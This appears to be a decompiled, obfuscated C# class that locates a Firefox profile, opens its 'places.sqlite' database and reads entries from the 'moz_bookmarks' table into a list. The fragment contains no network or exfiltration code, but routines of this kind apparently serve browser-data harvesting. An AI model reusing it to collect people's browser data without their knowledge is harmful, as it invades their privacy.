using System.Collections.Generic;
using System.IO;

internal class Class78
{
	public static List<Struct4> smethod_0(string string_0)
	{
		List<Struct4> list = new List<Struct4>();
		string text = Class53.smethod_2(string_0);
		if (text == null)
		{
			return list;
		}
		Class54 @class = Class54.smethod_1(Path.Combine(text, "places.sqlite"), "moz_bookmarks");
		if (@class == null)
		{
			return list;
		}
		for (int i = 0; i < @class.method_1(); i++)
		{
			Struct4 item = default(Struct4);
			item.String_1 = GClass13.smethod_4(@class.method_0(i, 5));
			if (GClass13.smethod_4(@class.method_0(i, 1)).Equals("0") && item.String_1 != "0")
			{
				list.Add(item);
			}
		}
		return list;
	}
}
